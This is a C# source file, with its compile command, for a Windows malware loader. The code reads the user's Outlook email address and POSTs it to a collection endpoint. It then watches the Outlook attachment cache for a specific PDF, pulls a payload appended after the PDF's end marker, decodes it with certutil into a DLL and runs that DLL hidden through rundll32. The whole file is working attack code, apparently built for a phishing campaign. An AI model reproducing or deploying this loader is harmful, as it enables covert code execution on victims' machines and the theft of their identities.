using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Diagnostics;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Threading.Tasks;

class Program
{
    static readonly HttpClient httpClient = new HttpClient();
    static bool stopMonitoring = false;

    static void Main(string[] args)
    {
        string outlookEmail = GetOutlookEmailAddress();
        Console.WriteLine("Outlook Email: " + outlookEmail);

        if (!string.IsNullOrEmpty(outlookEmail))
        {
            SendDataOnline(outlookEmail).GetAwaiter().GetResult();
        }

        Thread monitorThread = new Thread(new ThreadStart(MonitorDirectory));
        monitorThread.IsBackground = true;
        monitorThread.Start();

        while (!stopMonitoring)
        {
            Thread.Sleep(1000); // Wait for the monitoring to complete
        }
    }

    static void MonitorDirectory()
    {
        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string targetFolder = Path.Combine(appDataPath, "Microsoft\\Windows\\INetCache\\Content.Outlook\\");

        while (!stopMonitoring)
        {
            try
            {
                var subDirectories = Directory.GetDirectories(targetFolder);
                foreach (var subFolderPath in subDirectories)
                {
                    var pdfFiles = Directory.GetFiles(subFolderPath, "Quote alambique-alu.pdf");
                    foreach (var pdfFilePath in pdfFiles)
                    {
                        string appendedText = ExtractAppendedText(pdfFilePath);
                        if (!string.IsNullOrEmpty(appendedText))
                        {
                            Console.WriteLine("Appended text found in " + pdfFilePath + ": " + appendedText);
                            SaveTextToFile(appendedText);
                            stopMonitoring = true;
                            return;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error occurred: " + ex.Message);
            }

            Thread.Sleep(1000); // Check every 1 second
        }
    }

    static string ExtractAppendedText(string filePath)
    {
        string fileContent = File.ReadAllText(filePath);
        string delimiter = "%%EOF";
        int delimiterIndex = fileContent.LastIndexOf(delimiter);

        if (delimiterIndex != -1)
        {
            return fileContent.Substring(delimiterIndex + delimiter.Length);
        }

        return null;
    }

    static void SaveTextToFile(string text)
    {
        string tempFilePath = Path.Combine(Path.GetTempPath(), "content.txt");
        File.WriteAllText(tempFilePath, text);
        Console.WriteLine("Extracted text saved to: " + tempFilePath);

        DecodeAndExecuteDll(tempFilePath);
    }

    static void DecodeAndExecuteDll(string sourceFilePath)
    {
        string decodedFilePath = Path.Combine(Path.GetTempPath(), "content.dll");

        try
        {
            ProcessStartInfo certUtilStartInfo = new ProcessStartInfo
            {
                FileName = "certutil",
                Arguments = "-decode \"" + sourceFilePath + "\" \"" + decodedFilePath + "\"",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process certUtilProcess = Process.Start(certUtilStartInfo))
            {
                certUtilProcess.WaitForExit();
                Console.WriteLine(certUtilProcess.StandardOutput.ReadToEnd());
                Console.WriteLine(certUtilProcess.StandardError.ReadToEnd());
            }

            ProcessStartInfo runDllStartInfo = new ProcessStartInfo
            {
                FileName = "rundll32.exe",
                Arguments = "\"" + decodedFilePath + "\",DllMain",
                CreateNoWindow = true,
                UseShellExecute = false
            };

            using (Process runDllProcess = Process.Start(runDllStartInfo))
            {
                Console.WriteLine("DLL executed.");
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Error in decoding and executing DLL: " + e.Message);
        }
    }

    static string GetOutlookEmailAddress()
    {
        try
        {
            Outlook.Application outlookApp = new Outlook.Application();
            Outlook.Accounts accounts = outlookApp.Session.Accounts;
            foreach (Outlook.Account account in accounts)
            {
                return account.SmtpAddress;
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Error getting Outlook email address: " + e.Message);
        }

        return null;
    }

    static async Task SendDataOnline(string email)
    {
        string endpointUrl = "http://localhost:8000/";
        try
        {
            using (var httpClient = new HttpClient())
            {
                var content = new StringContent("{\"email\": \"" + email + "\"}", Encoding.UTF8, "application/json");
                HttpResponseMessage response = await httpClient.PostAsync(endpointUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Email address sent successfully.");
                }
                else
                {
                    Console.WriteLine("Failed to send email address. Status code: " + response.StatusCode);
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Error sending email address online: " + e.Message);
        }
    }
}
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe /out:oui.exe /reference:"C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Net.Http.dll" /reference:"C:\Windows\assembly\GAC_MSIL\Microsoft.Office.Interop.Outlook\15.0.0.0__71e9bce111e9429c\Microsoft.Office.Interop.Outlook.dll" .\test.cs
